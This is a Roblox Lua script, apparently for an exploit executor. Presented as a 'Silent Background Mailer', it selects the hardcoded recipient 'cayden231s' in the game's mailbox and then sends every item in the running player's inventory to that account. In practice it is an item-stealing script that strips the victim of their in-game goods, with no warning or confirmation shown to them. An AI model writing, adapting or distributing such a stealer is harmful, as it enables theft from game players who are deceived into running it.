-- Configuration
local targetUser = "cayden231s"
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Direct Core Layout Paths
local mailboxUI = playerGui:WaitForChild("MailboxUI")
local frame = mailboxUI:WaitForChild("Frame")
local sendingFrame = frame:WaitForChild("SendingFrame")
local itemSendFrame = sendingFrame:WaitForChild("ItemSendFrame")
local selectPlayerFrame = sendingFrame:WaitForChild("SelectPlayerFrame")
local playerList = selectPlayerFrame:WaitForChild("PlayerList")
local sendButton = itemSendFrame:WaitForChild("SendButton")

local function runTrueBackgroundAutomation()
    print("--- Initializing Silent Background Mailer ---")
    
    -- STEP 1: Find and select the player slot card
    local targetButton = nil
    for _, child in ipairs(playerList:GetChildren()) do
        if child:IsA("GuiObject") then
            local elements = child:GetDescendants()
            for _, el in ipairs(elements) do
                -- Checks for the visible display tag or the username tag handle
                if el:IsA("TextLabel") and (string.find(el.Text:lower(), targetUser:lower()) or string.find(el.Text:lower(), "rich")) then
                    targetButton = child
                    break
                end
            end
        end
        if targetButton then break end
    end
    
    if not targetButton then
        warn("Could not find a valid player card matching: " .. targetUser)
        return
    end
    
    print("Target player slot locked. Opening inventory window...")
    local playerToggle = targetButton:IsA("TextButton") and targetButton or targetButton:FindFirstChildOfClass("TextButton", true)
    if playerToggle then
        firesignal(playerToggle.MouseButton1Click)
        firesignal(playerToggle.Activated)
        
        -- Give the game UI layout a brief moment to switch windows and load frames
        task.wait(0.8) 
    end
    
    -- STEP 2: Drill down directly into the deep InventoryFrame container found in the scan
    local scrollingFramesFolder = itemSendFrame:FindFirstChild("ScrollingFrames")
    local inventoryFrame = scrollingFramesFolder and scrollingFramesFolder:FindFirstChild("InventoryFrame")
    
    if not inventoryFrame then
        warn("CRITICAL ERROR: Could not locate 'InventoryFrame' inside ScrollingFrames.")
        return
    end
    
    -- Gather all items inside your actual bag grid
    local items = inventoryFrame:GetChildren()
    print("Scanning item grid cells silently... Found elements: " .. tostring(#items))
    
    -- STEP 3: Automated background inventory clearing loop
    for _, cell in ipairs(items) do
        -- Strictly target actual item grids, ignore organizational constraints
        if cell:IsA("GuiObject") and cell.Name ~= "UIGridLayout" and cell.Name ~= "UIPadding" then
            
            -- Isolate the clickable node for the seed/item slot square
            local cellTrigger = cell:IsA("TextButton") and cell or cell:FindFirstChildOfClass("TextButton", true) or cell:FindFirstChildOfClass("ImageButton", true)
            
            if cellTrigger then
                print("Staging inventory item element: " .. cell.Name)
                firesignal(cellTrigger.MouseButton1Click)
                firesignal(cellTrigger.Activated)
                task.wait(0.2) -- Safe pause for the item to register in the staging slot
                
                -- Fire send confirmation action
                if sendButton then
                    firesignal(sendButton.MouseButton1Click)
                    firesignal(sendButton.Activated)
                    
                    -- Server network handshake cooldown to securely clear the slot out
                    task.wait(1.0)
                else
                    warn("Send confirmation button path became disconnected.")
                    break
                end
            end
        end
    end
    
    print("--- Background Automation Task Finished ---")
end

runTrueBackgroundAutomation()
